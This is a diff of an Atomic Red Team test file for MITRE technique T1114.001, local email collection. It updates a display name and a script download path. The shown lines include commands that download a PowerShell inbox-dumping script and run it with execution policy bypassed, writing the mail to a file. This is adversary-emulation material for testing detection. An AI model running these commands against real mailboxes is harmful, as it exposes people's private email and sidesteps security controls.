@@ -1,5 +1,5 @@
 attack_technique: T1114.001
-display_name: Local Email Collection
+display_name: 'Email Collection: Local Email Collection'
 atomic_tests:
 - name: Email Collection with PowerShell Get-Inbox
   auto_generated_guid: 3f1b5096-0139-4736-9b78-19bcb02bb1cb
@@ -26,7 +26,7 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{file_path}\Get-Inbox.ps1) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/src/Get-Inbox.ps1" -OutFile "#{file_path}\Get-Inbox.ps1"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1" -OutFile "#{file_path}\Get-Inbox.ps1"
   executor:
     command: |
       powershell -executionpolicy bypass -command #{file_path}\Get-Inbox.ps1 -file #{output_file}
